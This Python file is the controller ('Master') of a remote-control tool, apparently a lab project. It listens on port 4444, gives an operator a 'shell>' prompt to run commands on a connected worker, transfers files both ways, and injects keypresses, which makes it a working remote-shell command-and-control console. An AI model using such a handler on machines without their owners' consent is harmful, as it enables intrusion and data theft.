"""
Project: Remote Control System
Component: Master
Description:
    Controls a connected worker, sends commands, and handles file transfers.
"""

# ========================
# Imports
# ========================
import socket
import os
import sys

# ========================
# Configuration
# ========================
MASTER_IP = "192.168.56.102"
MASTER_PORT = 4444
BUFFER_SIZE = 4096

IDENTIFIER = "<END>"
TRANSFER_IDENTIFIER = "|"
ENCODED_IDENTIFIER = IDENTIFIER.encode()

ADDRESS = (MASTER_IP, MASTER_PORT)

# ========================
# Networking Utilities
# ========================
def recv_exact(sock, size):
    data = b""
    remaining = size

    while remaining > 0:
        chunk = sock.recv(min(BUFFER_SIZE, remaining))
        if not chunk:
            raise ConnectionError()
        data += chunk
        remaining -= len(chunk)

    return data


def recv_until(sock, buffer):
    while ENCODED_IDENTIFIER not in buffer:
        chunk = sock.recv(BUFFER_SIZE)
        if not chunk:
            raise ConnectionError("Connection closed")
        buffer += chunk

    data, buffer = buffer.split(ENCODED_IDENTIFIER, 1)
    return data, buffer

# ========================
# File Transfer Logic
# ========================
def recv_file(sock, src, dst):
    signal = recv_exact(sock, 2)

    if signal == b"ER":
        return "Worker encountered an error..."

    final_dst = os.path.join(dst, os.path.basename(src)) if os.path.isdir(dst) else dst

    sock.sendall(b"GO")
    filesize = int.from_bytes(recv_exact(sock, 8), byteorder="big")
    sock.sendall(b"OK")

    remaining = filesize

    with open(final_dst, "wb") as f:
        while remaining > 0:
            chunk = sock.recv(min(BUFFER_SIZE, remaining))
            if not chunk:
                raise ConnectionError()

            f.write(chunk)
            remaining -= len(chunk)

    return None


def send_file(sock, src):
    if not os.path.exists(src):
        sock.sendall(b"ER")
        return "Error: Path does not exist."
    elif os.path.isdir(src):
        sock.sendall(b"ER")
        return "Error: Path is a directory."

    sock.sendall(b"OK")
    signal = recv_exact(sock, 2)

    if signal == b"ER":
        return "Worker reported error"
    elif signal == b"GO":
        filesize = os.path.getsize(src)
        sock.sendall(filesize.to_bytes(8, byteorder="big"))

        signal = recv_exact(sock, 2)
        if signal == b"OK":
            with open(src, "rb") as f:
                while True:
                    chunk = f.read(4096)
                    if not chunk:
                        break
                    sock.sendall(chunk)
        else:
            return "Error: Worker message is not OK"

    return None

# ========================
# Core Logic
# ========================
def handle_master():
    master_socket = socket.socket()
    master_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    master_socket.bind(ADDRESS)
    master_socket.listen(5)

    print(f"[+] Listening on {MASTER_IP}:{MASTER_PORT}...")

    worker_socket, addr = master_socket.accept()
    print(f"[+] Connection received from {addr}")

    buffer = b""

    try:
        while True:
            # --- Command Input ---
            command = input("shell> ").strip()

            # --- Termination ---
            if command.lower() == "terminate":
                worker_socket.sendall(command.encode() + ENCODED_IDENTIFIER)
                break

            # --- File Transfer ---
            elif command.lower().startswith("transfer"):
                parts = command.split(TRANSFER_IDENTIFIER)

                if len(parts) != 4:
                    print("Usage: transfer | [mw/wm] | [src] | [dst]")
                    continue

                _, direction, src, dst = parts
                direction = direction.lower().strip()
                src = src.strip()
                dst = dst.strip()

                if direction in ["mw", "wm"]:
                    worker_socket.sendall(command.encode() + ENCODED_IDENTIFIER)

                    if direction == "mw":
                        error = send_file(worker_socket, src)
                        if error:
                            print(error)

                    elif direction == "wm":
                        error = recv_file(worker_socket, src, dst)
                        if error:
                            print(error)
                else:
                    print("Error: Invalid direction")
                    continue

            # --- Exit ---
            elif command.lower() == "exit":
                print("Soft exit initiated. Closing Master...")
                worker_socket.close()
                master_socket.close()
                sys.exit()

            # --- Keypress Command ---
            elif command.lower().startswith("keypress"):
                if TRANSFER_IDENTIFIER not in command:
                    print("Usage: keypress | [text or [key_name]]")
                    continue  # Don't send invalid command, just ask again
                worker_socket.sendall(command.encode() + ENCODED_IDENTIFIER)

            # --- General Command ---
            else:
                worker_socket.sendall(command.encode() + ENCODED_IDENTIFIER)

            # --- Receive Output ---
            raw_output, buffer = recv_until(worker_socket, buffer)
            print(raw_output.decode(errors="ignore"))

    except KeyboardInterrupt:
        print("\n[!] Shutting down server.")

    finally:
        worker_socket.close()
        master_socket.close()

# ========================
# Entry Point
# ========================
if __name__ == "__main__":
    handle_master()